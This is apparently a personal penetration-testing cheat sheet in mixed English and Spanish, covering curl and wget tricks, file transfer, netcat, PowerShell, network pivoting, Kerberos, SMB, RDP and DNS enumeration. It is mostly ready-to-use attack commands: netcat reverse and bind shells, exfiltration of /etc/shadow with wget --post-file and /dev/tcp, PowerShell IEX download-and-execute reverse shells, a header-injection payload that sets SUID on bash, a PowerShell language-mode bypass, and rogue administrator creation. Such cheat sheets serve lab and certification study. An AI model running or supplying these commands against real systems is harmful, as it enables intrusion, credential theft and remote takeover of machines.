curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
curl --proxy http://127.0.0.1:8080                                             // use proxy
curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
curl -I -X OPTIONS http://IP/Pagina/                                           // Check accepted methods
```

```c
 curl -s http://docker.hackthebox.eu:<puerto>/ -X POST -d hash=$(curl -s http://docker.hackthebox.eu:<puerto>/ -c cookie.txt | grep -oP "(?<=h3 align='center'>).*(?=</)" | tr -d "\n" | md5sum | tr -d -) -b cookie
```

```c
Login
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://IP:PORT/users/v1/login

Register
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://IP:PORT/users/v1/register

Login with token
curl  \
  'http://IP:PORT/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKTOKEN' \
  -d '{"password": "pwned"}'
```

Wget admits 255 character
Create 255 character files


```c
curl -s -X GET http://localhost/firewall.php -H "X-FOWARDED-FOR: 1.1.1.1 ; sudo chmod u+s /bin/bash | nc IP PORT;" -H "Cookie: PHPSESSID=5fufq0mqfu8f3oql8cijidhfhj"
```

```c
curl IP/$(whoami)
curl IP/`whoami`
```

Con curl probar extensiones diferentes

```c
ftp://
fi\le:///root/
```

$IFS es espacio

```c
fi\le:///root/root.txt$IFP-o$IFS/tmp/
```

Between keys it creates spaces on the comas

```c
{fi\le:///root/root.txt,-o,/tmp/}
```

```c
curl --config /file
```

IPv6

```c
curl -g -6 "http://[dead:beef:2:1006]":PORT/FILE
```

For JWT the header is "Authorization: bearer TOKEN" 

 With a token 
```c
curl -H "Authorization: bearer TOKEN" -i   http://IP:PORT/
```

###### Wget

If wget used copy  /etc/shadow or  id_rsa

```c
wget --post-file=/etc/shadow IP/fileshadow
```

```c
wget -O  - http://IP > /dev/null
```

#### File Transfer

##### Certutil

```c
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

##### Netcat

Scan ports

```c
nc -nvv -w 1 -z IP FromPORTs-ToPORTS     in TCP
nc -nv -u -z -w 1 IP FromPORTs-ToPORTS     in UDP
```

```c
nc -lnvp <LPORT> < <FILE>
nc <RHOST> <RPORT> > <FILE>
```

Listen on a port

```c
nc -nlvp <puerto>
```

Connect to a port

```c
nc -nv <ip> <puerto>
 -e execute an executable.
```

Bind shell
CONSOLA 1

```c
nc -nlvp <puerto> -e <shell> 
```

CONSOLA attacker

```c
nc -nv <puerto>
```

Reverse shell
CONSOLA 1 

```c
nc -nlvp <puerto>
```

CONSOLA attacker

```c
nc -nv <puerto> -e <shell>
```

If no permits of using nc then 

```c
which authbind
```

```c
ls -l /etc/authbind/
```

```c
3 folders
	byaddr
	byport → Ports with listen permissions
	byuid
```

```c
authbind nc -nlvp 80
```

```c
authbind python -m pyftpdlib -p21 -w
```

Check that it exists an user agent when a get request is send to the victims machine

Curl 

-K parameter defined on the file se 

```c
url = "http://IP"
```

```c
data = @/root/root.txt
```

```c
url = "file:///root/root.txt"
```

```c
output = /tmp/.0xdf
```

No python or nc

Victim machine  

```c
cat FILE > /dev/tcp/IP/PORT
```

Download files with python

```c
import urllib.request
urllib.request.urlretrieve("http://www.example.com/songs/mp3.mp3", "mp3.mp3")
```

Attacker machine

```c
nc -nlvp 443 > FILE
```

Send files to machines

Copy

```c
base64 -w 0 FILE ; echo
```

```c
echo "CONTENT" | base64 -d Z file
```

TCP SCAN

```c
nc -nvv -w 1 -z <ip> <puertos> (puertos en rango x-y)
```

UDP SCAN

```c
nc -nv -u -z -w 1 <ip> <puertos>
```

Enviar una bash 

```c
nc -e /bin/bash IP PORT
```

Put the shell on the background 

```c
nohup nc -e /bin/bash IP PORT &
```

Enviar archivos
1 Sender Machine 

```c
cat FILE | nc IP PORT
```

2 Receive Machine

```c
nc -nlvp PORT > FILE
```

Windows 

```c
nc.exe IP PORT -w 3 < FiletoDownload
```

```c
while true; do nc -lv <listeningport> ; done
```
##### NCAT

Similar to netcat. SSL connections

Listen

```c
ncat -lvp <puerto>
```
Connect 

```c
ncat -v <puerto>
```

```c
Flags
-e <shell>
--allow <ip> (permitir solo una ip)
--ssl (habilita cifrado)
```

##### Impacket

```c
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support
copy * \\<LHOST>\<SHARE>
```

##### Samba server

```c
service smbd start
```

Check is running

```c
smbclient -N \\\\127.0.0.1\\open\\
```

```c
/etc/samba/smb.conf
```

##### PowerShell

```c
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

##### Bash only

###### wget version

Paste directly to the shell.

```c
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

```c
__wget http://<LHOST>/<FILE>
```

###### curl version

```c
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```c
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

#### FTP

```c
ftp <RHOST>
ftp -A <RHOST>
wget -r ftp://anonymous:anonymous@<RHOST>
```

connect 
```c
ftp IP
ftp user@ftpdomain.com
```
```c
list content dir
```

Try upload a  file 

```c
put file.txt
```
User:  anonymous
Password:  anonymous@domain.com


```c
wget -m --no-passive ftp://USER:PASSWORD@IP
wget -m --no-passive ftp://anonymous:anonymous@IP
```

Mount ftp

```c
curlftpfs USER:PASS@IP LOCATE_MOUNT
showmount -e IP
mount -t nfs IP:/NFS_DIR  /mnt/NUESTRO_DIR
```

#### Kerberos

```c
sudo apt-get install krb5-kdc
```

##### Ticket Handling

```c
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
export KRB5CCNAME=<FILE>.ccache
export KRB5CCNAME='realpath <FILE>.ccache'
```

##### Kerberos related Files

```c
/etc/krb5.conf                   // kerberos configuration file location
kinit <USERNAME>                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // "key table" file for one or more principals
kadmin                           // kerberos administration console
add_principal <EMAIL>            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

##### Ticket Conversion

###### kribi to ccache

```c
base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi
impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache
export KRB5CCNAME=`realpath <USERNAME>.ccache`
```

###### ccache to kirbi

```c
impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi
base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64
```

#### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

##### Download Proxy and Agent

```c
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

##### Prepare Tunnel Interface

```c
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
sudo ip link set ligolo up
```

##### Setup Proxy on Attacker Machine

```c
./proxy -laddr <LHOST>:443 -selfcert
```

##### Setup Agent on Target Machine

```c
./agent -connect <LHOST>:443 -ignore-cert
```

##### Configure Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

###### Port Forwarding

```c
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

#### Linux

##### CentOS

```c
doas -u <USERNAME> /bin/sh
```

##### Environment Variables

```c
export PATH=`pwd`:$PATH
```

##### gcc

```c
gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

##### getfacl

```c
getfacl <LOCAL_DIRECTORY>
```

##### iconv

```c
echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
```

##### vi

```c
:w !sudo tee %    # save file with elevated privileges without exiting
```

##### Windows Command Formatting

```c
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

#### Microsoft Windows

##### dir find files windows

```c
dir /a
dir /a:d
dir /a:h
dir flag* /s /p
dir /s /b *.log
dir /s /b /ah C:\.git
```
find files in powershell

```c
cmd.exe /c "dir /s/b c:\FILE.txt"
```

How to execute commands

https://lolbas-project.github.io/#

```c
systeminfo 
netsat -nat // open ports
netstat -ap tcp
plink.exe -l root -pw perfect -R 445:127.0.0.1:445 10.10.14.16
net user
net user henrial contrasenia /add // new user
net localgroup Administrators henrial /add //add to admin group
net group  GROUPNAME USERNAME /add
sc queryex type=service state=all | find /i "SERVICE_NAME:" // list services
net localgroup administrators "SECURA\USER" /add
```

###### Powershell Nishang

Invoke-PowerShellTcp.ps1  on the botton 

```c
Invoke-PowerShellTcp -Reverse -IPAddres ##LA nuestra# -Port 443 
```

```c
start /b powershell IEX(New-Object Net.Web.Client).downloadString('http://IP:PORT/Ps.ps1' )
cmd /c powershell IEX(New-Object Net.Web.Client).downloadString('http://IP:PORT/Ps.ps1' )
powershell -c iex(iwr http://IP/Ps.ps1 -usebasicparsin)
command = "powershell IEX(New-Object Net.WebClient).downloadString('http://IP/Ps.ps1')" // from browser
```

HTTP file download

```c
IWR -URI http://IP:PORT/FILE -OutFile PSbypass.exe
    -OutFile %temp% //leave the file on a temporary folder
```

```c
certutil.exe -f -urlcache -split http://IPJP.exe
```

```c
powershell -c "iwr http://10.10.14.33/nc.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd <MYIP> 443
```

Run from native route

```c
start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/Invoke-PowerShellTcp.ps1)
```

URL

```c
?cmd=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%22http://IP/Ps.ps1%22)%20|%20powershell%20-noprofile%20-)
```

Bypass for PowerShell Constrained Language Mode

```c
$executioncontext.sessionstate.languagemode → ConstrainedLangage  Restricted mode https://github.com/padovah4ck/PSByPassCLM
PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug → PSBypassCLM.exe 
Utility en C:\Windows\microsoft.net\framework64\ → choose utility v4.0.30319
```

```c
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=Tre /U /revshell=true /rhost=IP_MIA /rport=443 C:\Users\Direccion_delPSBY.exe
```

```c
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe rev.csproj IWR -URI http://10.10.14.8:8000/execute_shell.xml -OutFile rev.csproj
```

```c
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=True /U /revshell=true /rhost=10.10.14.8 /rport=443 C:\Users\amanda\Downloads\Psby.exe
```

NETCAT

```c
?cmd=powershell invoke-webrequest -uri IP:PORT/nc.exe -outfile NAME.exe
despues para ejecutar: NAME.execurl 
NAME.exe IP PORT -e powershell
```

```c
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.6/Ps.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"
```


#### PHP Webserver

```c
sudo php -S 127.0.0.1:80
```

#### Ping

```c
ping -c 1 <RHOST>
ping -n 1 <RHOST>
```

#### Port Forwarding

##### Chisel

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

###### Reverse Pivot

- LHOST < APPLICATION SERVER

###### LHOST

```c
./chisel server -p 9002 -reverse -v
```

###### APPLICATION SERVER

```c
./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
./chisel client 192.168.45.169:9002 R:60002:127.0.0.1:60002 R:3306:127.0.0.1:3306
```

```c
go build .
go build -ldflags "-s -w" .
upx chisel
```

1. enviar a la maquina linux el archivo chisel de windows
2. En nuestra maquina atacante ejecutamos el chisel para abrir el puerto que queramos en modo serve
```c
./chisel server --reverse --port 1234
```

3. En la maquina victima, se ejecuta el chisel en modo cliente→
```c
C:\Windows\Temp\chisel.exe client IP:1234 R:PORTQUEREMOSABRIR:127.0.0.1:PORTQQUEREMOSABRIR
```

1) se conecta a el puerto 1234 del servidor chisel
2) R → remotee port fordwarding para que el puerto 445 se convierta en el puerto 445 de la maquina atacante local

```c
crackmapexec 127.0.0.1 -u 'username'  -p 'password '
```

###### SOCKS5 / Proxychains Configuration

- LHOST > APPLICATION SERVER > NETWORK

###### LHOST

```c
./chisel server -p 9002 -reverse -v
```

###### APPLICATION SERVER

```c
./chisel client 192.168.50.10:9002 R:socks
```

Pivoting Chisel de kali a windows

En kali con proxychains socks5 en 1080

KALI escucha en el puerto 8080 por defecto
```c
./chisel server --socks5 --reverse
```

Windows

```c
.\chisel_windows.exe client --fingerprint 6F8h9OQGNQhnYUvLXbQiq+8xpH/jRdK+DSs7hx6DhW8= MI_IP:8080 R:socks
```

##### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

###### Download Proxy and Agent

> https://github.com/nicocha30/ligolo-ng/releases

```c
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
```

###### Prepare Tunnel Interface

```c
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
sudo ip link set ligolo up
```

###### Setup Proxy on LHOST

```c
./proxy -laddr 192.168.50.10:443 -selfcert
```

###### Setup Agent on APPLICATION SERVER

```c
./agent -connect 192.168.50.10:443 -ignore-cert
```

###### Configure Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
sudo ip r add 172.16.50.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

###### Port Forwarding

- LHOST < APPLICATION SERVER > DATABASE SERVER

```c
[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
```

##### Socat

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > DATABASE SERVER

###### APPLICATION SERVER

```c
ip a
ip r
socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
```

###### LHOST

```c
psql -h <RHOST> -p 2342 -U postgres
```

##### SSH Tunneling

###### Local Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

###### APPLICATION SERVER

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh <USERNAME>@192.168.100.10
ip a
ip r
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;
ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
```

###### LHOST

```c
smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

###### Dynamic Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

###### APPLICATION SERVER

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
```

###### LHOST

```c
sudo ss -tulpn
tail /etc/proxychains4.conf
socks5 192.168.50.10 9999
proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

###### Remote Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST <-> FIREWALL <-> APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

###### LHOST

```c
sudo systemctl start ssh
sudo ss -tulpn
```

###### APPLICATION SERVER

```c
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
```

###### LHOST

```c
psql -h 127.0.0.1 -p 2345 -U postgres
```

###### Remote Dynamic Port Forwarding

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST < FIREWALL < APPLICATION SERVER > NETWORK

###### APPLICATION SERVER

```c
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 <USERNAME>@192.168.50.10
```

###### LHOST

```c
sudo ss -tulpn
tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
```

##### sshuttle

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

###### APPLICATION SERVER

```c
socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
```

###### LHOST

```c
sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
```

with id_rsa

In victim machines

```c
cat id_rsa.pub >> authorized_keys
```

```c
sshuttle -v -r MI_IP RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa'
sshuttle -vr user@IP_VICITMA RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa' //desde maquina atacante a maquina victima de donde la id_rsa
```

```c
sshuttle -r USER@IP_VICTIM RED_Q_KIERO/24
```

##### FIFO

```c
#!/usr/bin/env bash

set -e

if [ $# != 3 ]; then

        echo 'Usage: nc-tcp-forward.sh $FRONTPORT $BACKHOST $BACKPORT' >&2
        exit 1
fi

FRONTPORT=$1
BACKHOST=$2
BACKPORT=$3

FIFO=/tmp/backpipe

trap 'echo "trapped."; pkill nc; rm -f $FIFO; exit 1' 1 2 3 15

mkfifo $FIFO
while true; do
        nc -l $FRONTPORT <$FIFO | nc $BACKHOST $BACKPORT >$FIFO
done
rm -f $FIFO
```

##### ssh.exe

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK

###### LHOST

```c
sudo systemctl start ssh
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

###### PORT FORDWARDING

```c
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8080 127.0.0.1 80
```

###### WINDOWS JUMP SERVER

```c
where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
```

###### LHOST

```c
ss -tulpn
tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
proxychains psql -h 10.10.100.20 -U postgres
```

##### Plink

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER

###### LHOST

```c
find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

###### WINDOWS JUMP SERVER

```c
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
```

###### LHOST

```c
ss -tulpn
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
```

##### Netsh

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER

###### LHOST

```c
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

###### WINDOWS JUMP SERVER

```c
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
netstat -anp TCP | findstr "2222"
netsh interface portproxy show all
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
```

###### LHOST

```c
sudo nmap -sS 192.168.50.10 -Pn -n -p2222
ssh database_admin@192.168.50.10 -p2222
```

###### WINDOWS JUMP SERVER

```c
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
```

###### Pivoting Kerberos

```c
In /etc/proxychains.conf socks4 127.0.0.1 1080
```

Get ticket of user

```c
proxychains getTGT.py -dc-ip <DC_IP> -aesKey <AESKey> <DOMAIN>/<USER>
```

Save ticket

```c
export KRB5CCNAME=<USER>.ccache
```

Get systemshell on a Machine with the ticket

```c
proxychains psexec.py -dc-ip <DC_IP> -target-ip <MTARGET_IP> -no-pass -k <DOMAIN1>/<USERNAME>@<DOMAINofMACHINE>
```

#### Python Webserver

```c
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
```

#### RDP

```c
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert:ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert:ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
xfreerdp /v:<RHOST>:PORT /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /drive:share,/home/henrial  // join the share into the home of kali
 xfreerdp FILE.rdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:etc.host.com /size:80% /port:PORT
rdesktop <RHOST>

```

#### showmount

```c
/usr/sbin/showmount -e <RHOST>
sudo showmount -e <RHOST>
chown root:root sid-shell; chmod +s sid-shell
```

#### SMB

```c
mount.cifs //<RHOST>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

##### nbtscan

```c
nbtscan <ip>
nbtscan -r <rango/x>  localizar smb en red
```

##### smbmap

```c
smbmap -H IP
```

```c
smbmap -H IP -u 'null'
```

List recursevely the folder server-smb 

```c
smbmap -d DOMAIN -H IP -R CARPETA
```

Download

```c
smbmap -d DIRECTORIO -H IP -R CARPETA -A FIHCERO_DESCARGA
smbmap -H [ip] -d [domain] -u [user] -p [password]
```

```c
smbmap -H IP -u svc-printer -p "PASS" -r C$/DIRECTORY -A FILE.TXT
```

```c
smbmap -H IP -u svc-printer -p "PASS" -g PATHTOFILE/FILE
```

```c
smbmap -u ned.flanders_adm -p Lefthandedyeah! -d corp.local -H IP
```

##### smbcacls

List privileges in folders 

```c
for file in $(ls); do echo $file; done | while read line; do echo -e "\n[*] $line:\n"; smbcacls //IP/DIRECTORY domain/$line -U USER%PASS | grep -i "everyone"; done
smbcacls //IP/DIRECTORY domain/$line -U USER%PASS 
```

#### DNS

Each domain can use different types of DNS records. Some of the most common types of DNS records include:

	NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
	A: Also known as a host record, the "a record" contains the IPv4 address of a hostname (such as www.megacorpone.com).
	AAAA: Also known as a quad A host record, the "aaaa record" contains the IPv6 address of a hostname (such as www.megacorpone.com).
	MX: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
	PTR: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
	CNAME: Canonical Name Records are used to create aliases for other host records.
	TXT: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.

##### Dns enumeration

```c
cat list.txt
router
mail
owa
proxy
ftp
www

for ip in $(cat list.txt); do host $ip.DOMAIN.com; done
```

```c
host -t mx DOMAIN.com
```

##### dig 

Name server

```c
dig ns DOMINIO @IP
```

Mail server

```c
dig ms DOMINIO @IP
```

Pointers

```c
dig ptr DOMINIO @IP
```

DNS Info

```c
dig axfr @IP
dnsenum DOMAIN
```

Domain zone transfer

```c
dig axfr DOMINIO @IP
dnsrecon -d dominio -t AXFR 
dnsrecon -d dominio -a
dnsrecon -d DOMAIN.com -t std   -t type attack standard
```

Bruteforce extensions

```c
dnsrecon -d DOMAIN.com -D ~/list.txt -t brt
```

All subdomains

```c
dig @IP DOMAIN 't AXFR +nocookie
```

If server is blind 

```c
dig version.bind CHAOS TXT @IP
```
nslookup 

```c
nslookup -type=TXT SUBD.DOMAIN.com IP
```

```c
server IP
IP
   ⇒ set q=NS  name server  MX mail server
   ⇒ doman.com
   ⇒ exit
```
Brute force

```c
dnsenum DOMAIN -f /path_to_dns_dic
dnsmap DOMAIN  thats its own bruteforce
```

```c
fierce -dns DOMAIN
fierce -dns else.domain -dnsserver DOMAIN
```

#### smbclient

```c
smbclient -L \\<RHOST>\ -N
smbclient -L //<RHOST>/ -N
smbclient -L ////<RHOST>/ -N
smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
smbclient //<RHOST>/<SHARE>
smbclient //<RHOST>/<SHARE> -U <USERNAME>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<RHOST>/<SHARE>
smbclient //IP//Folder -U 'USER%PASS' -c "dir"
smbclient \\\\IP\\Folder -U USER --pw-nt-hash HASH
smbclient -L RHOST -U anonymous%anonymous
smbclient  //RHOST/share -U anonymous%anonymous //smb prompt
smbclient -L \\IP -U DOMAIN.local/user --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
If NT_STATUS_CONNECTION_DISCONNECTED 

```c
--option='client min protocol=NT1'
```


```c
smbclient -L IP -N 2>/dev/null | grep “CARPETA” | awk '{print $1}' | while read sharedFolder; do echo "===$(sharedFolder)=="; smbclient //IP/${sharedFolder} -c "dir"; echo; done

